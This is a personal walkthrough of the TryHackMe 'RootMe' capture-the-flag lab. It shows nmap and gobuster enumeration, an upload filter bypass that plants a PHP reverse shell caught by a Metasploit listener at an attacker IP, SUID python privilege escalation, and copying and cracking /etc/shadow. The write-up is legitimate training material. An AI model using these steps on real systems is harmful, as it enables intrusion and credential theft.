## TryHackMe - RootMe
> Completed 14th June  2022.

This ended up being a very straight forward boot2root box that required skills that I had picked up on in previous labs. I used this as n opportunity to reinforce some of which I had learned.

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- Nmap
- Gobuster
- Metasploit
- JohnTheRipper

---
### Methodology
#### Objectives/Flags
1. user.txt
2. root.txt

---
#### Reconnaissance
Started off by enumerting the target.
```bash
nmap -T4 -Pn -sV <TargetIP>
```
```
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As a webserver was running, I navigated to it in a web browser to see what it's about and what can I further enumerate. While browsing the site's source code I ran `Gobuster` in the background to fuzz out directories. The wordlist used was `httparchive_directories_1m_2021_04_28.txt` which can be found [here](https://wordlists.assetnote.io/).
```bash
gobuster dir --url http://<TargetIP> -w <Wordlist> > <output.txt>
```
```
//uploads             (Status: 301) [Size: 314] [--> http://<TargetIP>/uploads/]
//panel               (Status: 301) [Size: 312] [--> http://<TargetIP>/panel/]  
```

![](/TryHackMe/RootMe/images/Root_001.jpg)
![](/TryHackMe/RootMe/images/Root_002.jpg)

As these two directories were revealed, navigating to them showed me that the site is capable of file uploads and that the upload directory could be accessed. I got to work preparing a reverse shell using metasploit.

#### Weaponization 
N/A

#### Delivery
The reverse shell code I used can be found [here](https://github.com/pentestmonkey/php-reverse-shell). My initial thought was that if the site uses `.php` files as webpages, I should be successful in getting a reverse shell connection if my rshell payload was also in `.php`. While poking at the upload form, we can see that `.php` files are forbidden from being uploaded via extension filtering. Using what I had learned back in my run through [Vulnversity](https://github.com/dozmert/Security-Labs/blob/main/TryHackMe/Vunversity/readme.md)I renamed the file extension to `.phphtml` as first attempt to bypass the filter. The upload was successful.

![](/TryHackMe/RootMe/images/Root_003.jpg)
![](/TryHackMe/RootMe/images/Root_004.jpg)

#### Exploitation
With a successful upload, I was able to see my reverse shell file in the site's upload file directory. I started up `Metasploit` to get a listener going.
```bash
sudo msfdb init && msfconsole
  use exploit/multi/handler
  set lhost <AttackerIP>
  set lport <AttackerListeningPort>
  run
```
From here I could execute the payload through the site which successfully establishes a connection to my listener.
```bash
$ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Installation 
N/A

#### Command & Control
N/A

#### Actions on Objective
At this point I started walking the file directory of the box hoping to find some loot.
```bash
cd /var/www/html/
  cat user.txt
    THM{***}
```
I had found my first flag in the web-app's directory. While I was here, I decided to exfiltrate `Website.zip` to my local machine to not only see if I could find anything of interest but perhaps reverse engineer and repurpose in the future. Additional directory exploring revealed that the user `www-data` had access to `passwd` which I copy+pasted onto my localhost.
```bash
cat /etc/passwd
```
As I didn't have the correct permissions to view `/etc/shadow` I started to search for binary manipulations that could escalate my viewing privileges. The box's walkthrough recommended [GTFObins](https://gtfobins.github.io/gtfobins/python/) which was a new resource for me. After some research I found that by running a command through python we could manipulate our session to give us a higher viewing privilege.
```bash
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
id
  uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```
![](/TryHackMe/RootMe/images/Root_005.jpg)
From here we could now view the shadow file which I also copy+psdyrf onyo my localhost.
```bash
cat /etc/shadow
```
Later in my exploration of the system I had found indications that `JohnTheRipper` was installed. I tried to dig through its files to see if there was past use recorded however yielding nothing, I decided to use it on my local machine to reduce my footprint. For the wordlist I used `rockyou.txt`.
![](/TryHackMe/RootMe/images/Root_006.jpg)
```bash
unshadow passwd.txt shadow.txt > unshadow.txt
john --wordlist=<wordlist> unshadow.txt > <output.txt>
```
After a short while the passwords are revealed for user `root` and `test`. I could now login as a root.
```bash
su
  su: must be run from a terminal
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-4.4$
```
Trying to run `su` wasn't going to work as we had manipulated our session to be `sh`. By using a command, we had previously learned, we can re manipulate the session to be a `bash` terminal.
```bash
su
  su
  Password: P**********
root@rootme:/#
root@rootme:/# id
  uid=0(root) gid=0(root) groups=0(root)
```
We are now successfuly logged in as the `root` user and we could now loot the final flag.
```bash
root@rootme:/# cat /root/root.txt
cat /root/root.txt
  THM{***}
```

---
### After-action
#### What I've learned
After completing this box in less time than some other boxes I felt I was reinforcing my knowledge for the boot2root process. New things I learned specifically was just additional vectors for privilege-escalation which were tricky to get my head around but manipulating binaries is all it takes. I'll hold onto [GTFObins](https://gtfobins.github.io/) as a future resource.

#### What I would've done differently
If I was to take on this box again, I would like to have a better understanding of why the `python` binary could be manipulated in such a way and develop a method to prove the vulnerability by checking for versions etc.
